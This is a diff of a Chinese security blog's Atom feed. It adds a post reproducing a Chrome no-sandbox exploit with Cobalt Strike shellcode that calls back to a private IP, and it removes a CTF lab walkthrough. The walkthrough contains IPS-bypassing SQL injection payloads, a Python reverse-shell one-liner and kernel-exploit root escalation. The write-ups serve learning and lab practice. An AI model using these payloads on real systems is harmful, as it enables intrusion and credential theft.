@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://misakikata.github.io/"/>
-  <updated>2021-04-02T09:30:53.590Z</updated>
+  <updated>2021-04-15T08:33:51.022Z</updated>
   <id>https://misakikata.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Chrome 0day复现</title>
+    <link href="https://misakikata.github.io/2021/04/Chrome-0day%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://misakikata.github.io/2021/04/Chrome-0day复现/</id>
+    <published>2021-04-15T08:33:50.000Z</published>
+    <updated>2021-04-15T08:33:51.022Z</updated>
+    
+    <content type="html"><![CDATA[<p>前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141913647.png" alt="image-20210415141913647"></p><p>先运行第一个poc，<a href="https://github.com/r4j0x00/exploits">https://github.com/r4j0x00/exploits</a>，此处是开启了一个本地环境。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141840516.png" alt="image-20210415141840516"></p><p>再试一下另一个新的，chrome的修复版本90也存在影响。<a href="https://github.com/avboy1337/1195777-chrome0day">https://github.com/avboy1337/1195777-chrome0day</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415151034661.png" alt="image-20210415151034661"></p><p>此版本的POC其中的shellcode格式很眼熟，尝试利用cobaltstrike生成C#的payload。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415145847136.png" alt="image-20210415145847136"></p><p>生成后提取其中的十六进制的shellcode字段。类似如下。</p><pre class="line-numbers language-none"><code class="language-none">0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, ......0xf9, 0x1f, 0x00, 0xc6, 0xf5, 0x3b, 0xd3, 0x99, 0x7b, 0x9a, 0xf4, 0xba, 0x71, 0x45, 0x52, 0x29, 0x67, 0xeb, 0x53, 0x59, 0xc5, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x31, 0x31, 0x2e, 0x31, 0x33, 0x30, 0x00, 0x12, 0x34, 0x56, 0x78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>替换原exploit的shellcode字段。类似如下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150014088.png" alt="image-20210415150014088"></p><p>谷歌执行，会一直在加载的未响应状态，查看cs的能看到一个chrome进程的反弹shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150140652.png" alt="image-20210415150140652"></p><p>但由于正常使用默认设置是沙盒环境，此漏洞并不影响，所以这个还得需要配合沙盒逃逸才有效果。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Laboratory</title>
@@ -467,30 +491,6 @@
     
     
       <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>6Days Lab - v1.0.1</title>
-    <link href="https://misakikata.github.io/2020/03/6Days-Lab-v1-0-1/"/>
-    <id>https://misakikata.github.io/2020/03/6Days-Lab-v1-0-1/</id>
-    <published>2020-03-25T07:35:02.000Z</published>
-    <updated>2020-03-25T08:08:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p><p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.66.20.100&#x2F;image.php?src&#x3D;https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p><p>那么这里也可能有SQL注入。</p><p>先查看上面文件读取是否可以读取到文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p><p>再去读取优惠码页面，里面有个sql语句的拼接。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p><p>再去查看config.php。发现数据库的账号密码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p><p>再去尝试读取本地系统文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p><p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。&#x2F;proc&#x2F;pid&#x2F;cmdline   则可以看到对应pid进程的完整命令行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p><p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p><p>查询得知两字段</p><pre class="line-numbers language-none"><code class="language-none">aaaa%2527union%2520select%25201,2%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p><p>库名，应该是需要查询<code>fancydb</code></p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p><p>查表名</p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p><p>字段名</p><pre class="line-numbers language-none"><code class="language-none">aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p><p>查询到账号密码<code>andrea:SayNoToPentests</code></p><pre class="line-numbers language-none"><code class="language-none">aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p><p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p><p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p><p>那就直接试试ssh，确实可以登陆但是没有回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p><p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p><p>尝试python反弹</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>，获取原生终端</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p><p>目录下有个suid位文件，不过不能利用，权限不对。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p><p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p><p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p><p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p><p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png&quot; alt=&quot;ima
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
